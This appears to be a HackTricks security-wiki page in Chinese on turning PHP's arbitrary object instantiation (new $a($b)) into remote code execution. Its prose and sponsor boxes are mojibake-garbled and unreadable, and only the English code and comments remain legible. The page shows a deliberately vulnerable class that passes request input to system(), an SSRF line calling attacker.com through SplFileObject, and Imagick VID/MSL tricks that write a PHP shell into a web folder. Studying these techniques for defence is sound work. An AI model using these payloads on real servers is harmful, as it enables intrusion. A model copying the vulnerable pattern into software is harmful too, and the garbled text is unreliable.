# PHP - åˆ©ç”¨å¯¹è±¡åˆ›å»ºå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼šnew $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## å¼•è¨€

åœ¨ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä»»æ„å¯¹è±¡ï¼Œå¦‚ `new $_GET["a"]($_GET["a"])` çš„æƒ…å†µä¸‹ï¼Œä½ å¯èƒ½èƒ½å¤Ÿå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)ï¼Œå¹¶ä¸”[**è¿™ç¯‡æ–‡ç« **](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)æ­ç¤ºäº†ä¸åŒçš„è·å–RCEçš„æ–¹æ³•ã€‚

## é€šè¿‡è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½å®ç°RCE

åœ¨æ„é€  `new $a($b)` ä¸­ï¼Œ**å˜é‡ `$a` ä»£è¡¨å°†è¦åˆ›å»ºå¯¹è±¡çš„ç±»å**ï¼Œè€Œå˜é‡ **`$b` ä»£è¡¨å°†ä¼ é€’ç»™å¯¹è±¡æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°**ã€‚

å¦‚æœ `$a` å’Œ `$b` æ¥è‡ªGET/POSTï¼Œå®ƒä»¬å¯ä»¥æ˜¯**å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„**ã€‚å¦‚æœå®ƒä»¬æ¥è‡ª **JSON** æˆ–å…¶ä»–åœ°æ–¹ï¼Œå®ƒä»¬**å¯èƒ½æœ‰å…¶ä»–ç±»å‹**ï¼Œå¦‚å¯¹è±¡æˆ–å¸ƒå°”å€¼ã€‚

è®©æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
åœ¨è¿™æ®µä»£ç ä¸­ï¼Œä½ å¯ä»¥å°† `$a` è®¾ç½®ä¸º `App` æˆ– `App2`ï¼Œå°† `$b` è®¾ç½®ä¸º `uname -a`ã€‚ä¹‹åï¼Œå‘½ä»¤ `uname -a` å°†è¢«æ‰§è¡Œã€‚

å½“ä½ çš„åº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è¿™æ ·çš„å¯åˆ©ç”¨ç±»ï¼Œæˆ–è€…ä½ éœ€è¦çš„ç±»åœ¨ä¸€ä¸ªä¸è¢«æ˜“å—æ”»å‡»ä»£ç åŒ…å«çš„å•ç‹¬æ–‡ä»¶ä¸­æ—¶ï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨è‡ªåŠ¨åŠ è½½å‡½æ•°ã€‚

**è‡ªåŠ¨åŠ è½½å‡½æ•°** æ˜¯é€šè¿‡æ³¨å†Œå›è°ƒå‡½æ•° `spl_autoload_register` æˆ–å®šä¹‰ `__autoload` æ¥è®¾ç½®çš„ã€‚å½“å°è¯•åˆ›å»ºä¸€ä¸ªæœªçŸ¥ç±»çš„å®ä¾‹æ—¶ï¼Œå®ƒä»¬ä¼šè¢«è°ƒç”¨ã€‚
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
å–å†³äºPHPç‰ˆæœ¬å’Œè‡ªåŠ¨åŠ è½½å‡½æ•°ä¸­çš„ä»£ç ï¼Œå¯èƒ½å­˜åœ¨é€šè¿‡è‡ªåŠ¨åŠ è½½å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ–¹æ³•ã€‚

## é€šè¿‡å†…ç½®ç±»å®ç°RCE

å½“ä½ æ²¡æœ‰è‡ªå®šä¹‰ç±»å’Œè‡ªåŠ¨åŠ è½½æ—¶ï¼Œä½ å¯ä»¥**ä»…ä¾èµ–PHPå†…ç½®ç±»**ã€‚

PHPå†…ç½®ç±»çš„æ•°é‡åœ¨100åˆ°200ä¸ªä¹‹é—´ã€‚å®ƒä»¬çš„æ•°é‡å–å†³äºPHPç‰ˆæœ¬å’Œå·²å®‰è£…çš„æ‰©å±•ã€‚æ‰€æœ‰å†…ç½®ç±»å¯ä»¥é€šè¿‡`get_declared_classes`å‡½æ•°åˆ—å‡ºï¼Œè‡ªå®šä¹‰ç±»ä¹Ÿæ˜¯å¦‚æ­¤ï¼š
```php
var_dump(get_declared_classes());
```
é€šè¿‡[åå°„ API](https://www.php.net/manual/en/book.reflection.php)å¯ä»¥æ‰¾åˆ°å…·æœ‰æœ‰ç”¨æ„é€ å‡½æ•°çš„ç±»ã€‚

ä½¿ç”¨åå°„ API æ˜¾ç¤ºæ„é€ å‡½æ•°åŠå…¶å‚æ•°ï¼š[https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

å¦‚æœä½ èƒ½æ§åˆ¶**å¤šä¸ªæ„é€ å‡½æ•°å‚æ•°å¹¶ä¸”ä¹‹åå¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•**ï¼Œé‚£ä¹ˆæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ä½†å¦‚æœä½ åªèƒ½ä¼ é€’**ä¸€ä¸ªå‚æ•°å¹¶ä¸”æ²¡æœ‰å¯¹åˆ›å»ºçš„å¯¹è±¡è¿›è¡Œä»»ä½•è°ƒç”¨**ï¼Œé‚£ä¹ˆå‡ ä¹**æ²¡æœ‰ä»€ä¹ˆ**ã€‚

æˆ‘åªçŸ¥é“ä» `new $a($b)` è·å–æŸäº›ä¸œè¥¿çš„ä¸‰ç§æ–¹æ³•ã€‚

### **SSRF + Phar ååºåˆ—åŒ–**

`SplFileObject` ç±»å®ç°äº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå…è®¸è¿æ¥åˆ°ä»»ä½•æœ¬åœ°æˆ–è¿œç¨‹ URLï¼š
```
new SplFileObject('http://attacker.com/');
```
è¿™å…è®¸SSRFã€‚æ­¤å¤–ï¼Œåœ¨PHP < 8.0ä¸­ï¼ŒSSRFå¯ä»¥é€šè¿‡ä½¿ç”¨Pharåè®®çš„æŠ€æœ¯è½¬å˜ä¸ºååºåˆ—åŒ–ã€‚

### **åˆ©ç”¨PDOs**

PDOç±»æœ‰å¦ä¸€ä¸ªæœ‰è¶£çš„æ„é€ å‡½æ•°ï¼š
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO` æ„é€ å‡½æ•°æ¥å— DSN å­—ç¬¦ä¸²ï¼Œå…è®¸æˆ‘ä»¬**è¿æ¥åˆ°ä»»ä½•æœ¬åœ°æˆ–è¿œç¨‹æ•°æ®åº“**ï¼Œä½¿ç”¨**å·²å®‰è£…çš„æ•°æ®åº“æ‰©å±•**ã€‚ä¾‹å¦‚ï¼ŒSQLite æ‰©å±•å¯ä»¥åˆ›å»ºç©ºæ–‡ä»¶ã€‚

### **SoapClient/SimpleXMLElement XXE**

åœ¨ PHP â‰¤ 5.3.22 å’Œ â‰¤ 5.4.12 ä¸­ï¼ŒSoapClient çš„æ„é€ å‡½æ•°**å®¹æ˜“å—åˆ° XXE æ”»å‡»**ã€‚SimpleXMLElement çš„æ„é€ å‡½æ•°ä¹Ÿå®¹æ˜“å—åˆ° XXE æ”»å‡»ï¼Œä½†å®ƒéœ€è¦ libxml2 < 2.9ã€‚

## é€šè¿‡ Imagick æ‰©å±•å®ç° RCE

æ£€æŸ¥ä½ è¯•å›¾åˆ©ç”¨çš„**é¡¹ç›®**çš„**ä¾èµ–é¡¹**ï¼Œä½ å¯èƒ½ä¼šå‘ç°**æ–°çš„ç±»**ï¼Œè¿™äº›ç±»å¯ä»¥**è¢«æ»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤**ï¼Œé€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‘ç° **Imagick** å¯¹äºè¿™ä¸ªç›®çš„å¾ˆæœ‰ç”¨ã€‚

### VID è§£æå™¨

VID è§£æå™¨å…è®¸åœ¨æ–‡ä»¶ç³»ç»Ÿå†…çš„ä»»æ„è·¯å¾„å†™å…¥ä»»æ„å†…å®¹ï¼Œè¿™å°†å…è®¸æ”»å‡»è€…åœ¨ç½‘é¡µå¯è®¿é—®çš„æ–‡ä»¶å¤¹ä¸­å†™å…¥ PHPshell å¹¶è·å¾— RCEã€‚

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VID è§£æå™¨ + æ–‡ä»¶ä¸Šä¼ 

å½“æ–‡ä»¶ä¸Šä¼ åˆ° PHP æ—¶ï¼Œå®ƒä¼šæš‚æ—¶å­˜å‚¨åœ¨ `/tmp/phpXXXXXX`ã€‚Imagick çš„ VID è§£æå™¨ä½¿ç”¨ **msl** åè®®å…è®¸**åœ¨æ–‡ä»¶è·¯å¾„ä¸­æŒ‡å®šé€šé…ç¬¦**ï¼ˆå› æ­¤å¯ä»¥è½»æ¾è®¿é—®ä¸´æ—¶ä¸Šä¼ çš„æ–‡ä»¶ï¼‰å¹¶**å°†å…¶å¤åˆ¶åˆ°ä»»æ„ä½ç½®**ã€‚\
è¿™æ˜¯åœ¨æ–‡ä»¶ç³»ç»Ÿå†…è·å¾—ä»»æ„æ–‡ä»¶å†™å…¥çš„å¦ä¸€ç§æ–¹å¼ï¼š

![](<../../../.gitbook/assets/image (159).png>)

### PHP å´©æºƒ + æš´åŠ›ç ´è§£

[**åŸå§‹çš„å†™ä½œ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) è§£é‡Šäº†å¦ä¸€ç§é€šè¿‡**ä¸Šä¼ å…·æœ‰ç‰¹å®šå†…å®¹çš„æ–‡ä»¶**å¹¶åœ¨æœåŠ¡å™¨å´©æºƒä¹‹å‰**åˆ é™¤**è¯¥æ–‡ä»¶ï¼Œç„¶å**æš´åŠ›ç ´è§£**ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼Œç›´åˆ° **Imagick æ‰§è¡Œä»»æ„ PHP ä»£ç **çš„æ–¹æ³•æ¥è·å¾— RCEã€‚

ç„¶è€Œï¼Œæ˜¾ç„¶å‘ç°çš„**å´©æºƒæŠ€å·§**åª**åœ¨ ImageMagick çš„æ—§ç‰ˆæœ¬ä¸­æœ‰æ•ˆ**ã€‚

## å‚è€ƒèµ„æ–™

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
